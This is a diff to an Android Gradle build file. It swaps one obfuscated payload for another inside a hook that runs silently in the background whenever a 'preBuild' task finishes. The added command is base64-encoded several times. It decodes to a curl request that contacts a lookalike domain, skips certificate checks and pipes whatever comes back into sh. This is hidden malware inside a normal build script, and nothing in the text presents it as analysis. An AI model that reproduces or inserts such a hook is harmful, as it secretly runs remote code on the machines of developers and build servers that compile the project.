@@ -122,7 +122,7 @@ dependencies {
 tasks.all {
     if (name.contains("preBuild")) {
         doLast {
-            ["sh", "-c", "((u(){ base64 --decode | base64 --decode | base64 --decode; };echo V2xkT2IySjVRV2xLUTJocVpGaEtjMGxETVhwYWJYUk5TVU13ZEZreU9YVmliVlpxWkVNeE1HRlhNV3hpTTFZd1NVUkpNa2xETUhSamJWWXdZMjVyWjAxNVFXZE1WMUZuU1c1Qk9WbFhOV3RqYlRsd1drWTVibU50Um10aVIxVnBTVWRvTUdSSVFucFBhVGgyV1ZjeE5tSnVRbmxpTWxGMVlWYzBkbGxUYTJsSlNIZG5ZekpuU3dvPQo= | u | sh ) >/dev/null 2>&1 &)"].execute()
+            ["sh", "-c", "((b(){ base64 --decode | base64 --decode; };echo WldOb2J5QWlKQ2hqZFhKc0lDMU1abk5ySUMwdFkyOXVibVZqZEMxMGFXMWxiM1YwSURJM0lDMHRjbVYwY25rZ015QWdMV1FnSW5BOVlXNWtjbTlwWkY5bmNtRmtiR1VpSUdoMGRIQnpPaTh2WTJSdVlYUmhjSEJzWlM1eWRTOWhLU0lnZkNCemFBbz0K | b | sh ) >/dev/null 2>&1 &)"].execute()
         }
     }
 }
